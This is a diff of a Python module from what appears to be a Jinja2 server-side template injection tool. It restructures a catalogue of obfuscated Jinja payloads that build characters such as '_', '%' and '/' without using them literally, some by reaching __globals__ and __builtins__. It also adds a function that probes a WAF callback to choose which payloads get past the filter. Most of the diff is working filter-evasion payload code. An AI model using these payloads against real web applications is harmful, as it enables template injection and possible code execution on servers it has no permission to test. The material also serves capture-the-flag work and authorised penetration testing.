@@ -7,6 +7,7 @@ import logging
 import random
 import string
 import re
+from .const import WafFunc, SET_STMT_PATTERNS
 
 logger = logging.getLogger("context_vars")
 
@@ -17,7 +18,7 @@ ContextPayloads = Dict[str, Context]
 Waf = Callable[[str], bool]
 
 # 所有上下文的payload, 变量名不能重复
-context_payloads_all: ContextPayloads = {
+context_payloads_stmts: ContextPayloads = {
     "{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}"
     + "{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}": {
         "oa": 0,
@@ -41,42 +42,49 @@ context_payloads_all: ContextPayloads = {
         "ssbb": 556,
         "zzeb": 223,
     },
-    "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}": {"zols": 2015},
-    "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}": {"ltr": 178},
-    "{%set lea=namespace|escape|urlencode|escape|"
-    + "urlencode|urlencode|urlencode|count%}": {"lea": 134},
-    "{%set lel=cycler|escape|urlencode|escape|urlenc"
-    + "ode|escape|urlencode|escape|urlencode|count%}": {"lel": 131},
-    "{%set qo=namespace|escape|urlencode|escape|urlencode|count%}": {"qo": 90},
-    "{%set bs=cycler|escape|urlencode|count%}": {"bs": 65},
-    "{%set ab=namespace|escape|count%}": {"ab": 46},
-    "{%set zb={}|escape|list|escape|count%}": {"zb": 26},
-    "{%set t=joiner|urlencode|wordcount%}": {"t": 7},
-    "{%set b={}|escape|urlencode|count%}": {"b": 6},
-    "{%set e=(dict(a=x,b=x,c=x)|count)%}": {"e": 3},
-    "{%set l={}|escape|first|count%}": {"l": 1},
-    "{%set ndl=({}|select()|trim|list)[24]%}": {"ndl": "_"},
-    "{%set ndll={}|select()|trim|list|batch(25)|first|last%}": {"ndll": "_"},
-    "{%set ndlll={}|select()|trim|list|attr(dict(po=x,p=x)|join)(24)%}": {"ndlll": "_"},
-    "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
-    + "((ndr,ndr,dict(truediv=x)|join,ndr,ndr)|join)|attr"
-    + "((ndr,ndr,dict(doc=x)|join,ndr,ndr)|join)|batch(12)|first|last%}": {
+    (
+        "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
+        + "((ndr,ndr,dict(truediv=x)|join,ndr,ndr)|join)|attr"
+        + "((ndr,ndr,dict(doc=x)|join,ndr,ndr)|join)|batch(12)|first|last%}"
+    ): {
         "ndr": "_",
         "sls": "/",
     },
-    "{%set unn=lipsum|escape|batch(22)|first|last%}": {"unn": "_"},
-    "{%set perc=lipsum()|urlencode|first%}": {"perc": "%"},
-    "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
-    + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
-    + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
-    + ")[24]))*2][dict(chr=x)|join](37))%}": {"percc": "%"},
-    "{%set perccc=({0:1}|safe).replace((1|safe).rjust(2),"
-    + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))%}": {
-        "perccc": "%"
-    },
-    "{%set prrc=((dict(dict(dict(a=1)|tojson|batch(2),)|batch(2),)|join,"
-    + "dict(c=x)|join,dict()|trim|last)|join).format((9,9,9,1,9)|sum)%}": {"prrc": "%"},
-    "{%set prrrc=1.__mod__.__doc__.__getitem__(11)%}": {"prrrc": "%"},
+}
+
+context_payloads_exprs = {
+    "1.__mod__.__doc__.__getitem__(11)": "%",
+    (
+        "((dict(dict(dict(a=1)|tojson|batch(2),)|batch(2),)|join,"
+        + "dict(c=x)|join,dict()|trim|last)|join).format((9,9,9,1,9)|sum)"
+    ): "%",
+    (
+        "({0:1}|safe).replace((1|safe).rjust(2),"
+        + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))"
+    ): "%",
+    (
+        "(lipsum[((({}|select()|trim|list)[24]))*2+"
+        + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
+        + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
+        + ")[24]))*2][dict(chr=x)|join](37))"
+    ): "%",
+    "lipsum()|urlencode|first": "%",
+    "({}|select()|trim|list)[24]": "_",
+    "lipsum|escape|batch(22)|first|last": "_",
+    "{}|select()|trim|list|batch(25)|first|last": "_",
+    "{}|select()|trim|list|attr(dict(po=x,p=x)|join)(24)": "_",
+    "{}|escape|first|count": 1,
+    "dict(a=x,b=x,c=x)|count": 3,
+    "{}|escape|urlencode|count": 6,
+    "joiner|urlencode|wordcount": 7,
+    "{}|escape|list|escape|count": 26,
+    "namespace|escape|count": 46,
+    "cycler|escape|urlencode|count": 65,
+    "namespace|escape|urlencode|escape|urlencode|count": 90,
+    ("cycler|escape|urlencode|escape|urlenc"
+    + "ode|escape|urlencode|escape|urlencode|count"): 131,
+    "{}|escape|urlencode|list|escape|urlencode|count": 178,
+    "lipsum|escape|urlencode|list|escape|urlencode|count": 2015
 }
 
 
@@ -114,12 +122,12 @@ def filter_by_used_context(
     }
 
 
-class ContextVariableUtil:
+class ContextVariableManager:
     """管理上下文变量payload的工具类
     这个类管理类似{%set xxx%}的payload以及其对应的变量名与值
     """
 
-    def __init__(self, waf: Waf, context_payloads: ContextPayloads):
+    def __init__(self, waf: WafFunc, context_payloads: ContextPayloads):
         self.waf = waf
         self.context_payloads = context_payloads.copy()
         self.payload_dependency = {}
@@ -257,3 +265,29 @@ class ContextVariableUtil:
             for _, d in self.context_payloads.items()
             for var_name, var_value in d.items()
         }
+
+
+def get_context_vars_manager(waf: WafFunc) -> ContextVariableManager:
+    context_payloads = context_payloads_stmts.copy()
+    manager = ContextVariableManager(waf, context_payloads)
+    manager.do_prepare()
+
+    set_stmt_pattern = None  # sth like "{%set NAME=EXPR%}"
+    for pattern, test_pattern in SET_STMT_PATTERNS:
+        if waf(test_pattern):
+            set_stmt_pattern = pattern
+            break
+
+    if not set_stmt_pattern:
+        return manager
+
+    for expr, value in context_payloads_exprs.items():
+        if not waf(expr):
+            continue
+        name = manager.generate_random_variable_name()
+        if not name:
+            continue
+        stmt = set_stmt_pattern.replace("NAME", name).replace("EXPR", expr)
+        _ = manager.add_payload(stmt, {name: value})
+
+    return manager
